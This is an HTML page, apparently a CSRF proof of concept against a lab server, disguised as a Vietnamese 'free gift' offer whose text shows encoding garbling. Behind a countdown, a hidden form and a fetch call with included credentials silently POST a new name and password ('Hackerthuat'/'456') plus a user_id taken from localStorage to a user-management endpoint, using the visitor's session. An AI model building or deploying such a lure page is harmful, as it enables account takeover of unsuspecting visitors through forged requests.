<!DOCTYPE html>
<html>
<head>
    <title>Nh·∫≠n Qu√† Mi·ªÖn Ph√≠</title>
    <!-- Bootstrap CSS cho giao di·ªán -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f7f7f7;
            padding-top: 50px;
            text-align: center;
        }
        .promo-box {
            margin: 50px auto;
            max-width: 600px;
            padding: 20px;
            background-color: #fff;
            border: 2px solid #d32f2f;
            border-radius: 10px;
        }
        h1 {
            color: #d32f2f;
            font-size: 28px;
        }
        .countdown {
            font-size: 24px;
            color: #333;
            margin: 20px 0;
        }
        .btn-primary {
            background-color: #d32f2f;
            border-color: #d32f2f;
        }
        .btn-primary:hover {
            background-color: #b71c1c;
            border-color: #b71c1c;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="promo-box">
            <h1>üéÅ Nh·∫≠n Qu√† Mi·ªÖn Ph√≠!</h1>
            <p>Vui l√≤ng ch·ªù <span id="countdown">5</span> gi√¢y ƒë·ªÉ nh·∫≠n ph·∫ßn th∆∞·ªüng...</p>
            <button class="btn btn-primary" disabled>ƒêang x·ª≠ l√Ω...</button>
        </div>
    </div>

    <!-- Form ·∫©n v·ªõi id t·ª´ localStorage -->
    <form id="createUserForm" action="http://192.168.33.10:8080/form_user.php" method="POST" style="display:none">
        <input type="hidden" name="name" value="Hackerthuat">
        <input type="hidden" name="password" value="456">
        <input type="hidden" name="submit" value="submit">
        <input type="hidden" id="userIdInput" name="id" value="">
    </form>

    <script>
        // Ch·ªù DOM t·∫£i xong v√† th·ª±c thi
        window.onload = function() {
            const countdownElement = document.getElementById('countdown');
            const form = document.getElementById('createUserForm');
            const userIdInput = document.getElementById('userIdInput');
            if (countdownElement && form && form.tagName === 'FORM' && userIdInput) {
                let count = 5;
                console.log('Form v√† c√°c ph·∫ßn t·ª≠ ƒë∆∞·ª£c t√¨m th·∫•y, b·∫Øt ƒë·∫ßu ƒë·∫øm ng∆∞·ª£c...');
                const countdown = setInterval(() => {
                    countdownElement.textContent = count;
                    count--;
                    if (count < 0) {
                        clearInterval(countdown);
                        // L·∫•y user_id t·ª´ localStorage v√† ƒë·∫∑t v√†o input
                        const userId = localStorage.getItem('user_id');
                        if (userId) {
                            console.log('ƒê√£ l·∫•y user_id:', userId);
                            userIdInput.value = userId; // ƒê·∫∑t id v√†o input
                        } else {
                            console.log('Kh√¥ng t√¨m th·∫•y user_id, s·∫Ω th·ª≠ c·∫≠p nh·∫≠t kh√¥ng id...');
                        }
                        console.log('ƒêang g·ª≠i form...');
                        // S·ª≠ d·ª•ng fetch ƒë·ªÉ g·ª≠i POST
                        fetch(form.action, {
                            method: 'POST',
                            body: new FormData(form),
                            credentials: 'include' // G·ª≠i cookie session
                        })
                        .then(response => {
                            console.log('Ph·∫£n h·ªìi t·ª´ server:', response.status, response.statusText);
                            return response.text();
                        })
                        .then(text => console.log('N·ªôi dung ph·∫£n h·ªìi:', text))
                        .catch(error => console.error('L·ªói khi g·ª≠i form:', error));
                        // Chuy·ªÉn h∆∞·ªõng sau 1 gi√¢y
                        setTimeout(() => {
                            window.location.href = 'http://192.168.33.10:8080';
                        }, 10000);
                    }
                }, 1000);
            } else {
                console.error('L·ªói: Kh√¥ng t√¨m th·∫•y ph·∫ßn t·ª≠ countdown, form, ho·∫∑c userIdInput!', {
                    countdownElement,
                    form,
                    userIdInput
                });
            }
        };
    </script>
</body>
</html>